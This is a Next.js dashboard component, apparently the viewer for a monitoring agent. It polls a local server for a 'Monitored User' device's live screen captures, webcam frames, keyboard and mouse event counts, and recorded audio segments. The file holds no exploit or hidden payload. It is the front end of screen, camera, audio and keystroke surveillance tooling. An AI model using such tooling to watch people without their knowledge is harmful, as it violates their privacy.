"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { useLang, t } from "../../lib/i18n";
import { safeDateString } from "../../lib/time";
import MiniLineChart from "./MiniLineChart";

const SERVER_URL = "http://localhost:3000";

type Device = {
  id: string;
  lastSeen?: number | null;
};

type InputEvent = {
  deviceId: string;
  type?: string;
  timestamp?: string;
  action?: string;
  detail?: Record<string, unknown>;
};

type AudioSegment = {
  deviceId: string;
  timestamp?: string;
  file?: string;
};

export default function Live() {
  const { lang, setLang } = useLang();
  const [devices, setDevices] = useState<Device[]>([]);
  const [inputEvents, setInputEvents] = useState<InputEvent[]>([]);
  const [audioSegments, setAudioSegments] = useState<AudioSegment[]>([]);
  const [cameraOk, setCameraOk] = useState<Record<string, boolean>>({});
  const [screenOk, setScreenOk] = useState<Record<string, boolean>>({});
  const [tick, setTick] = useState(0);

  const userNames: Record<string, string> = {
    "cam-001": "Monitored User"
  };

  useEffect(() => {
    async function loadDevices() {
      try {
        const res = await fetch(`${SERVER_URL}/devices`);
        const data = await res.json();
        setDevices(Array.isArray(data.devices) ? data.devices : []);
      } catch {
        setDevices([]);
      }
    }

    loadDevices();
    const timer = setInterval(loadDevices, 3000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    async function loadInputs() {
      try {
        const res = await fetch(`${SERVER_URL}/input/events`);
        const data = await res.json();
        setInputEvents(Array.isArray(data.events) ? data.events : []);
      } catch {
        setInputEvents([]);
      }
    }

    async function loadAudio() {
      try {
        const res = await fetch(`${SERVER_URL}/audio/list`);
        const data = await res.json();
        setAudioSegments(Array.isArray(data.segments) ? data.segments : []);
      } catch {
        setAudioSegments([]);
      }
    }

    loadInputs();
    loadAudio();

    const timer = setInterval(() => {
      loadInputs();
      loadAudio();
    }, 3000);

    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => setTick((t) => t + 1), 1000);
    return () => clearInterval(timer);
  }, []);

  function summarize(events: InputEvent[]) {
    if (events.length === 0) return t(lang, "无数据", "No data");
    const last = events[events.length - 1];
    const time = last.timestamp ? safeDateString(last.timestamp) : "unknown";
    const count = events.length;
    return `${count} events · last ${time}`;
  }

  function buildSeries(events: { timestamp?: string }[], bucketMs = 10 * 60 * 1000, windowMs = 6 * 60 * 60 * 1000) {
    const now = Date.now();
    const start = now - windowMs;

    const buckets = new Map<number, number>();

    for (const evt of events || []) {
      const ts = evt?.timestamp ? Date.parse(evt.timestamp) : NaN;
      if (!Number.isFinite(ts) || ts < start) continue;

      const bucket = Math.floor(ts / bucketMs) * bucketMs;
      buckets.set(bucket, (buckets.get(bucket) || 0) + 1);
    }

    let totalBuckets = Math.floor(windowMs / bucketMs);
    if (!Number.isFinite(totalBuckets) || totalBuckets < 2) totalBuckets = 2;

    const labels: string[] = [];
    const values: number[] = [];

    for (let i = 0; i < totalBuckets; i += 1) {
      const ts = start + i * bucketMs;
      const d = new Date(ts);

      labels.push(Number.isFinite(d.getTime()) ? d.toLocaleTimeString() : "");
      values.push(buckets.get(ts) || 0);
    }

    return {
      labels: labels.slice(-36),
      values: values.slice(-36)
    };
  }

  const deviceCards = devices.length > 0 ? devices : [{ id: "cam-001", lastSeen: null }];

  return (
    <main>
      <header>
        <h1>{t(lang, "实时监控", "Live View")}</h1>
        <nav>
          <Link href="/">{t(lang, "首页", "Home")}</Link>
          <Link href="/events">{t(lang, "事件", "Events")}</Link>
          <Link href="/docs">{t(lang, "说明", "Docs")}</Link>
        </nav>
        <button className="lang-toggle" type="button" onClick={() => setLang(lang === "zh" ? "en" : "zh")}>
          {lang === "zh" ? "EN" : "中文"}
        </button>
      </header>

      {deviceCards.map((device) => {
        const keyboardEvents = inputEvents.filter(
          (e) => e.type === "keyboard" && e.deviceId === device.id
        );

        const mouseEvents = inputEvents.filter(
          (e) => e.type === "mouse" && e.deviceId === device.id
        );

        const audioForDevice = audioSegments.filter((e) => e.deviceId === device.id);

        const keyboardSeries = buildSeries(keyboardEvents);
        const mouseSeries = buildSeries(mouseEvents);
        const audioSeries = buildSeries(audioForDevice);

        return (
          <section key={device.id} className="device-card">
            <div className="device-header">
              <div>
                <h2>{userNames[device.id] || t(lang, "被监控用户", "Monitored User")}</h2>
                <div className="mono">
                  {t(lang, "设备 ID：", "Device ID: ")}
                  {device.id}
                </div>
              </div>
              <div className="status-pill">
                {device.lastSeen ? t(lang, "在线", "Online") : t(lang, "离线", "Offline")}
              </div>
            </div>

            <div className="grid-2">
              <div className="card">
                <div className="card-title">
                  <h3>{t(lang, "屏幕", "Screen")}</h3>
                  <span className="mono">/screen/latest</span>
                </div>
                <div className="video-frame" style={{ padding: 0 }}>
                  {screenOk[device.id] === false && (
                    <div style={{ padding: 16, textAlign: "center" }}>
                      {t(lang, "无屏幕画面", "No screen feed")}
                      <div className="mono" style={{ marginTop: 6 }}>
                        {t(
                          lang,
                          "设备未授权屏幕录制或未启用 --screen。",
                          "Device may not allow screen capture or agent not started with --screen."
                        )}
                      </div>
                    </div>
                  )}
                  <img
                    src={`${SERVER_URL}/screen/latest?deviceId=${device.id}&ts=${tick}`}
                    alt="screen"
                    style={{
                      width: "100%",
                      height: "100%",
                      objectFit: "contain",
                      borderRadius: 16,
                      display: screenOk[device.id] === false ? "none" : "block"
                    }}
                    onLoad={() => setScreenOk((prev) => ({ ...prev, [device.id]: true }))}
                    onError={() => setScreenOk((prev) => ({ ...prev, [device.id]: false }))}
                  />
                </div>
              </div>

              <div className="card">
                <div className="card-title">
                  <h3>{t(lang, "摄像头", "Camera")}</h3>
                  <span className="mono">/camera/latest</span>
                </div>
                <div className="video-frame" style={{ padding: 0 }}>
                  {cameraOk[device.id] === false && (
                    <div style={{ padding: 16, textAlign: "center" }}>
                      {t(lang, "无摄像头画面", "No camera feed")}
                      <div className="mono" style={{ marginTop: 6 }}>
                        {t(
                          lang,
                          "设备无摄像头或未启用 --camera-frames。",
                          "Device may not have a camera or agent not started with --camera-frames."
                        )}
                      </div>
                    </div>
                  )}
                  <img
                    src={`${SERVER_URL}/camera/latest?deviceId=${device.id}&ts=${tick}`}
                    alt="camera"
                    style={{
                      width: "100%",
                      height: "100%",
                      objectFit: "contain",
                      borderRadius: 16,
                      display: cameraOk[device.id] === false ? "none" : "block"
                    }}
                    onLoad={() => setCameraOk((prev) => ({ ...prev, [device.id]: true }))}
                    onError={() => setCameraOk((prev) => ({ ...prev, [device.id]: false }))}
                  />
                </div>
              </div>
            </div>

            <div className="input-grid">
              <div className="input-row">
                <div>
                  <strong>{t(lang, "键盘", "Keyboard")}</strong>
                  <div className="mono">{summarize(keyboardEvents)}</div>
                </div>
              </div>
              <div className="input-detail">
                <MiniLineChart labels={keyboardSeries.labels} values={keyboardSeries.values} />
              </div>

              <div className="input-row">
                <div>
                  <strong>{t(lang, "鼠标", "Mouse")}</strong>
                  <div className="mono">{summarize(mouseEvents)}</div>
                </div>
              </div>
              <div className="input-detail">
                <MiniLineChart labels={mouseSeries.labels} values={mouseSeries.values} />
              </div>

              <div className="input-row">
                <div>
                  <strong>{t(lang, "语音", "Audio")}</strong>
                  <div className="mono">
                    {audioForDevice.length > 0
                      ? t(
                          lang,
                          `${audioForDevice.length} 段 · 最近 ${safeDateString(
                            audioForDevice[audioForDevice.length - 1]?.timestamp
                          )}`,
                          `${audioForDevice.length} segments · last ${safeDateString(
                            audioForDevice[audioForDevice.length - 1]?.timestamp
                          )}`
                        )
                      : t(lang, "无数据", "No data")}
                  </div>
                </div>
              </div>
              <div className="input-detail">
                <MiniLineChart labels={audioSeries.labels} values={audioSeries.values} />
              </div>
            </div>
          </section>
        );
      })}
    </main>
  );
}